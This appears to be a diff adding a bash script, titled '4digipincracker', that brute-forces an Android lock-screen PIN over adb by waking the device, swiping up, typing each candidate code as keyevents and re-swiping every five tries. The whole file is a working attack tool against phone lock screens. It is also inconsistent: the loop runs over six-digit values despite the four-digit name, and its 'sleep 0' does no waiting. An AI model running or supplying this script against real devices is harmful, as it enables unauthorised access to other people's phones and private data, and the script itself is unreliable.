@@ -1,0 +1,34 @@
+# 4digipincracker
+
+#!/usr/bin/env bash
+
+echo ---------------
+echo -e "\e[1;32mPAYLOAD STARTED"
+echo ---------------
+
+adb shell input keyevent 82
+adb shell input swipe 407 1211 378 85
+
+echo -------------
+echo -e "\e[1;34mBRUTE FORCING"
+echo -------------
+
+for i in {000000..999999}; do
+
+    echo -----------
+    echo -e "\e[1;31m TRYING $i"
+    echo -----------
+	
+    for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+    done
+
+    adb shell input keyevent 66
+    
+    if ! (( `expr $i + 1` % 5 )); then
+        adb shell input keyevent 66
+        sleep 0
+        adb shell input keyevent 82
+        adb shell input swipe 407 1211 378 85
+    fi
+done
